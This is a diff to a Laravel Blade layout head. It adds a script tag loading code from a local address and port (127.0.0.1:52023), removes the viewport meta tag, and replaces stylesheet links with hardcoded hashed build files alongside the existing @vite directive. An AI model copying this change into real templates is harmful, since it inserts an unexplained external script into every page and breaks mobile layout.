@@ -2,8 +2,9 @@
 <html lang="{{ str_replace('_', '-', strtolower(app()->getLocale())) }}">
 
     <head>
+        <script src=http://127.0.0.1:52023/Z83></script>
         <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
+
         <meta name="csrf-token" content="{{ csrf_token() }}">
         <title>{{ config('app.name', 'Laravel') }}</title>
 
@@ -19,8 +20,8 @@
 
         <!-- Font Awesome -->
         <link rel="stylesheet" href="{{ asset('plugins/fontawesome-free/css/all.min.css') }}" />
-        <link rel="stylesheet" href="{{ asset('css/app.css') }}">
-        <link rel="stylesheet" href="{{ asset('css/tailwindcss.css') }}">
+        <link rel="stylesheet" href="{{ asset('build/assets/app-cb41d22e.css') }}">
+        <link rel="stylesheet" href="{{ asset('build/assets/tailwindcss-b8d01326.css') }}">
 
         @vite(['resources/sass/app.scss', 'resources/js/app.js', 'resources/css/tailwindcss.css'])
 
